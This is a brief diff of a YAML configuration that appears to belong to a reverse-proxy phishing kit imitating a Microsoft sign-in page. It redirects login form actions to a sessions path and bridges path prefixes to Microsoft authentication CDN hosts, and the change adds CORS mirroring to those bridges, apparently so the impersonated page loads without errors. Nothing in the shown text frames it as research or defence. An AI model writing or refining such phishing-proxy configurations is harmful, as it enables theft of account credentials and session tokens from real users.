@@ -19,5 +19,5 @@ blocklist:
 form_actions:
   - {selector: "form[action*=\"login\"]", action_to: "/common/sessions"}
 bridges:
-  - {prefix: "/_mscdn/", target_host: "aadcdn.msftauth.net", strip_prefix: true}
-  - {prefix: "/_mscdn2/", target_host: "aadcdn.msauth.net", strip_prefix: true}
+  - {prefix: "/_mscdn/", target_host: "aadcdn.msftauth.net", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_mscdn2/", target_host: "aadcdn.msauth.net", strip_prefix: true, cors: "mirror"}
